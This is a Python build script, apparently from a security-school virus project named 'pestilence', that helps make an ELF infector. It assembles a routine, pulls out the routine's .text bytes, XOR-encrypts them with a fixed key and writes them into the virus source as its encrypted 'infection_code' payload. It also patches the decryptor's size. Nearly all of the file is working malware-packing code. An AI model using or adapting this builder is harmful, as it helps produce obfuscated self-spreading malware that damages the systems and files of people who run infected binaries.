
import subprocess
import re
import os
from elftools.elf.elffile import ELFFile

# always adjust the size before running the script
old_size = hex(0x615)
virus_asm = "pestilence.asm"
key = 0xdeadbeefdeadbeef

def patch_infection_code( new_bytes):
    with open(virus_asm, 'r') as file:
        content = file.read()
    byte_list = [f"0x{byte:02x}" for byte in new_bytes]
    new_infection_code = 'infection_code :db ' + ', '.join(byte_list)



    infection_code_pattern = r"infection_code\s*:\s*db\s*[^;]+?db\s*[^;]+?(?=\s*proc_dir)"

    patched_content = re.sub(infection_code_pattern, new_infection_code, content)

    with open(virus_asm, 'w') as file:
        file.write(patched_content)


def cyclic_xor_encrypt(data,key):
    key_bytes = key.to_bytes(8,'little')
    encrypted_data = bytearray(data)
    for i in range(len(encrypted_data)):
        encrypted_data[i] ^= key_bytes[i % len(key_bytes)]
    return encrypted_data

def extract_text_segment(binary):
    with open(binary,"rb") as f:
        elf = ELFFile(f)
        text_section = elf.get_section_by_name('.text')
        if not text_section:
            raise ValueError("No .text section found in the ELF file")
        text_segment_data = text_section.data()
        return text_segment_data

def get_read_exec_segment(binary):
    with open(binary,"rb") as f:
        elf = ELFFile(f)
        for segment in elf.iter_segments():
            if segment['p_flags'] & 0x5 == 0x5:
                offset = segment['p_offset']
                size = segment['p_filesz']
                # print(f"segment offset : {hex(offset)}, size:{hex(size)}")
                return [offset,size]

    
def patch_decryptor_size(binary,old_size,new_size):
    with open(binary,'r') as file:
        content = file.read()
    modified = content.replace(old_size,new_size)

    with open(binary,'w') as file:
        file.write(modified)


ret = os.system("nasm -f elf64  routine.asm && ld -o routine routine.o")
if (ret != 0):
    print("error happen while compiling")
    exit()



a = get_read_exec_segment("routine")
patch_decryptor_size("routine.asm",old_size,hex(a[1]))
patch_decryptor_size(virus_asm,old_size,hex(a[1]))
ret = os.system("nasm -f elf64  routine.asm && ld -o routine routine.o")
if (ret != 0):
    print("error happen while compiling")
    exit()

text_seg = extract_text_segment("routine")
print(type(text_seg))
encrypted_text_segm = cyclic_xor_encrypt(text_seg,key)
print(encrypted_text_segm)
patch_infection_code(encrypted_text_segm)
# print("db ", end="")
# for i, byte in enumerate(encrypted_text_segm):
#     print(f"0x{byte:x}, ", end="")
#     if i != 0 and i % 8 == 0:
#         print("\ndb ", end="")
